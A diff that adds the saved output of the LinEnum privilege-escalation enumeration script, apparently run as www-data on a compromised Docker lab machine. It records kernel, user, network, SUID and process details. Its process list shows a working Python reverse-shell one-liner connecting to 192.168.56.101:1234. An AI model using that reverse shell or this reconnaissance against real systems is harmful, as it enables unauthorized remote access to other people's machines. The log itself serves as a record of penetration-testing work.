@@ -1,0 +1,382 @@
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Sat Oct  3 13:17:00 UTC 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux ee96b22a6a17 4.19.76-linuxkit #1 SMP Tue May 26 11:42:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.19.76-linuxkit (root@4abe09437d05) (gcc version 8.3.0 (Alpine 8.3.0)) #1 SMP Tue May 26 11:42:35 UTC 2020
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=18.04
+DISTRIB_CODENAME=bionic
+DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
+NAME="Ubuntu"
+VERSION="18.04.4 LTS (Bionic Beaver)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 18.04.4 LTS"
+VERSION_ID="18.04"
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+VERSION_CODENAME=bionic
+UBUNTU_CODENAME=bionic
+
+
+[-] Hostname:
+ee96b22a6a17
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+
+
+[-] Who else is logged on:
+ 13:17:00 up 17 min,  0 users,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+pablo:x:1000:1000:,,,:/home/pablo:/bin/bash
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x 1 root  root  4.0K Jul 27 21:09 .
+drwxr-xr-x 1 root  root  4.0K Oct  3 13:09 ..
+drwxr-xr-x 2 pablo pablo 4.0K Jul 27 21:09 pablo
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+OLDPWD=/tmp
+USER=www-data
+PWD=/tmp/LinEnum-master
+HOME=/var/www
+TERM=xterm
+SHELL=bash
+SHLVL=3
+_=/usr/bin/env
+
+
+[-] Path information:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+drwxr-xr-x 1 root root 4096 Jul 27 20:59 /bin
+drwxr-xr-x 1 root root 4096 Jul 27 20:59 /sbin
+drwxr-xr-x 1 root root 4096 Jul 27 20:59 /usr/bin
+drwxr-xr-x 1 root root 4096 Jul 24 14:59 /usr/local/bin
+drwxr-xr-x 1 root root 4096 Jul 24 14:59 /usr/local/sbin
+drwxr-xr-x 1 root root 4096 Jul 27 20:59 /usr/sbin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+
+
+[-] Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK           022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+total 20
+drwxr-xr-x 2 root root 4096 Jun 30 15:26 .
+drwxr-xr-x 1 root root 4096 Oct  3 13:09 ..
+-rwxr-xr-x 1 root root 1478 Apr 20  2018 apt-compat
+-rwxr-xr-x 1 root root 1176 Nov  2  2017 dpkg
+-rwxr-xr-x 1 root root  249 Jan 25  2018 passwd
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 6246  bytes 1832157 (1.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 6454  bytes 25912605 (25.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ip6tnl0: flags=128<NOARP>  mtu 1452
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 13588  bytes 56105192 (56.1 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13588  bytes 56105192 (56.1 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+tunl0: flags=128<NOARP>  mtu 1480
+        tunnel   txqueuelen 1000  (IPIP Tunnel)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[-] ARP history:
+? (172.17.0.1) at 02:42:3b:b5:bf:b7 [ether] on eth0
+
+
+[-] Nameserver(s):
+nameserver 192.168.65.1
+
+
+[-] Default route:
+default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      16/nginx: worker pr 
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      43/sh               
+tcp6       0      0 :::80                   :::*                    LISTEN      16/nginx: worker pr 
+
+
+[-] Listening UDP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1  18376  3132 pts/0    Ss+  13:09   0:00 bash entrypoint
+root         8  0.0  0.6  84952 12960 ?        Ss   13:09   0:00 php-fpm: master process (/usr/local/etc/php-fpm.conf)
+root         9  0.0  0.0   4568   912 pts/0    S+   13:09   0:00 tail -f /var/log/nginx/access.log /var/log/nginx/error.log
+root        15  0.0  0.0 141120  1576 ?        Ss   13:09   0:00 nginx: master process nginx
+www-data    16  0.1  0.2 141800  5272 ?        S    13:09   0:00 nginx: worker process
+www-data    17  0.0  0.1 141440  3424 ?        S    13:09   0:00 nginx: worker process
+www-data    18  0.0  0.1 141440  3432 ?        S    13:09   0:00 nginx: worker process
+www-data    19  0.0  0.1 141440  3484 ?        S    13:09   0:00 nginx: worker process
+www-data    22  0.0  0.5  85160 10344 ?        S    13:10   0:00 php-fpm: pool www
+www-data    23  0.0  0.5  85156 10344 ?        S    13:10   0:00 php-fpm: pool www
+www-data    24  0.0  0.5  85156 10400 ?        S    13:10   0:00 php-fpm: pool www
+www-data    25  0.0  0.5  85148 10404 ?        S    13:10   0:00 php-fpm: pool www
+www-data    28  0.0  0.5  85148 10464 ?        S    13:10   0:00 php-fpm: pool www
+www-data    43  0.0  0.0   4628   816 ?        S    13:11   0:00 sh -c /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+www-data    44  0.0  0.5  38216 10240 ?        S    13:11   0:00 /usr/bin/python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+www-data    45  0.0  0.1  18508  3348 pts/1    Ss   13:11   0:00 /bin/bash
+www-data    48  0.0  0.1  19308  2252 pts/1    S+   13:11   0:00 script /dev/null -c bash
+www-data    49  0.0  0.0   4628   816 pts/2    Ss   13:11   0:00 sh -c bash
+www-data    50  0.0  0.1  18508  3480 pts/2    S    13:11   0:00 bash
+www-data    62  0.0  0.1  10712  3520 pts/2    S+   13:16   0:00 /bin/bash ./LinEnum.sh
+www-data    63  0.3  0.1  10840  2900 pts/2    S+   13:16   0:00 /bin/bash ./LinEnum.sh
+www-data    64  0.0  0.0   4536   812 pts/2    S+   13:16   0:00 tee -a
+www-data   207  0.0  0.1  10840  2656 pts/2    S+   13:17   0:00 /bin/bash ./LinEnum.sh
+www-data   208  0.0  0.1  34404  2868 pts/2    R+   13:17   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
+lrwxrwxrwx 1 root root       9 Oct 25  2018 /usr/bin/python3 -> python3.6
+
+
+[-] /etc/init.d/ binary permissions:
+total 24
+drwxr-xr-x 1 root root 4096 Jul 24 14:47 .
+drwxr-xr-x 1 root root 4096 Oct  3 13:09 ..
+-rwxr-xr-x 1 root root 3809 Feb 14  2018 hwclock.sh
+-rwxr-xr-x 1 root root 4579 Apr  6  2018 nginx
+-rwxr-xr-x 1 root root 1191 Jan 17  2018 procps
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 4.0K
+drwxr-xr-x 1 root root 4.0K Jul 24 14:47 system
+
+/lib/systemd/system:
+total 36K
+-rw-r--r-- 1 root root  127 Mar  5  2020 fstrim.service
+-rw-r--r-- 1 root root  205 Mar  5  2020 fstrim.timer
+-rw-r--r-- 1 root root  173 Sep 27  2019 motd-news.service
+-rw-r--r-- 1 root root  161 Sep 27  2019 motd-news.timer
+-rw-r--r-- 1 root root  238 Sep  3  2019 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Sep  3  2019 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  326 Sep  3  2019 apt-daily.service
+-rw-r--r-- 1 root root  156 Sep  3  2019 apt-daily.timer
+-rw-r--r-- 1 root root 1013 Apr  6  2018 nginx.service
+
+
+### SOFTWARE #############################################
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/usr/bin/gcc
+
+
+[-] Installed compilers:
+ii  g++                            4:7.4.0-1ubuntu2.3                  amd64        GNU C++ compiler
+ii  g++-7                          7.5.0-3ubuntu1~18.04                amd64        GNU C++ compiler
+ii  gcc                            4:7.4.0-1ubuntu2.3                  amd64        GNU C compiler
+ii  gcc-7                          7.5.0-3ubuntu1~18.04                amd64        GNU C compiler
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 970 Jul 27 21:09 /etc/passwd
+-rw-r--r-- 1 root root 471 Jul 27 21:09 /etc/group
+-rw-r--r-- 1 root root 581 Apr  9  2018 /etc/profile
+-rw-r----- 1 root shadow 625 Jul 27 21:09 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
+-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
+-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
+-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
+-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
+-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
+-rw-r--r-- 1 root root 92 Apr  9  2018 /etc/host.conf
+-rw-r--r-- 1 root root 68 Oct  3 13:09 /etc/resolv.conf
+-rw-r--r-- 1 root root 191 Feb  7  2018 /etc/libaudit.conf
+-rw-r--r-- 1 root root 2584 Feb  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 2969 Feb 28  2018 /etc/debconf.conf
+-rw-r--r-- 1 root root 2683 Jan 17  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 812 Mar 24  2018 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 552 Apr  4  2018 /etc/pam.conf
+-rw-r--r-- 1 root root 497 Oct  5  2016 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 3028 Jun 30 15:26 /etc/adduser.conf
+-rw-r--r-- 1 root root 604 Aug 13  2017 /etc/deluser.conf
+-rw-r--r-- 1 root root 1260 Feb 26  2018 /etc/ucf.conf
+-rw-r--r-- 1 root root 5678 Jul 24 14:47 /etc/ca-certificates.conf
+
+
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x 2 root mail 4096 Jun 30 15:25 .
+drwxr-xr-x 1 root root 4096 Jul 24 14:47 ..
+
+
+[+] Looks like we're in a Docker container:
+14:name=systemd:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+12:pids:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+11:hugetlb:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+10:net_prio:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+9:perf_event:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+8:net_cls:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+7:freezer:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+6:devices:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+5:memory:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+4:blkio:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+3:cpuacct:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+2:cpu:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+1:cpuset:/docker/ee96b22a6a173b9c26a73acb2aaaf7dcef3fc21259e190eacad82e9d96458bc8
+-rwxr-xr-x 1 root root 0 Oct  3 13:09 /.dockerenv
+
+
+### SCAN COMPLETE ####################################
